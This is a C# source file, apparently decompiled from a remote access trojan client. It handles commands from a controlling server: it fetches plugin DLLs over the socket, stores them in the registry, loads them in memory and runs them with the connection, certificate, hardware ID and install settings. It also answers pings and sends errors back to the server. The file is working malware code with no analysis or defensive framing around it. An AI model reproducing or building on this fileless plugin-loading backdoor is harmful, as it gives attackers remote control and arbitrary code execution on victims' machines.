using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using Client.Connection;
using Client.Helper;
using Client.MessagePack;

namespace Client.Handle_Packet;

public static class Packet
{
	public static List<MsgPack> Packs = new List<MsgPack>();

	public static void Read(object data)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.DecodeFromBytes((byte[])data);
			switch (msgPack.ForcePathObject("Packet").AsString)
			{
			case "savePlugin":
				SetRegistry.SetValue(msgPack.ForcePathObject("Hash").AsString, msgPack.ForcePathObject("Dll").GetAsBytes());
				{
					foreach (MsgPack item in Packs.ToList())
					{
						if (item.ForcePathObject("Dll").AsString == msgPack.ForcePathObject("Hash").AsString)
						{
							Invoke(item);
							Packs.Remove(item);
						}
					}
					break;
				}
			case "plugin":
				try
				{
					if (SetRegistry.GetValue(msgPack.ForcePathObject("Dll").AsString) == null)
					{
						Packs.Add(msgPack);
						MsgPack msgPack3 = new MsgPack();
						msgPack3.ForcePathObject("Packet").SetAsString("sendPlugin");
						msgPack3.ForcePathObject("Hashes").SetAsString(msgPack.ForcePathObject("Dll").AsString);
						ClientSocket.Send(msgPack3.Encode2Bytes());
					}
					else
					{
						Invoke(msgPack);
					}
					break;
				}
				catch (Exception ex)
				{
					Error(ex.Message);
					break;
				}
			case "pong":
			{
				ClientSocket.ActivatePong = false;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").SetAsString("pong");
				msgPack2.ForcePathObject("Message").SetAsInteger(ClientSocket.Interval);
				ClientSocket.Send(msgPack2.Encode2Bytes());
				ClientSocket.Interval = 0;
				break;
			}
			}
		}
		catch (Exception ex2)
		{
			Error(ex2.Message);
		}
	}

	private static void Invoke(MsgPack unpack_msgpack)
	{
		dynamic val = Activator.CreateInstance(AppDomain.CurrentDomain.Load(Zip.Decompress(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString))).GetType("Plugin.Plugin"));
		val.Run(ClientSocket.TcpClient, Settings.ServerCertificate, Settings.Hwid, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX, Settings.BDOS, Settings.Install);
		Received();
	}

	private static void Received()
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Packet").AsString = "Received";
		ClientSocket.Send(msgPack.Encode2Bytes());
		Thread.Sleep(1000);
	}

	public static void Error(string ex)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Packet").AsString = "Error";
		msgPack.ForcePathObject("Error").AsString = ex;
		ClientSocket.Send(msgPack.Encode2Bytes());
	}
}
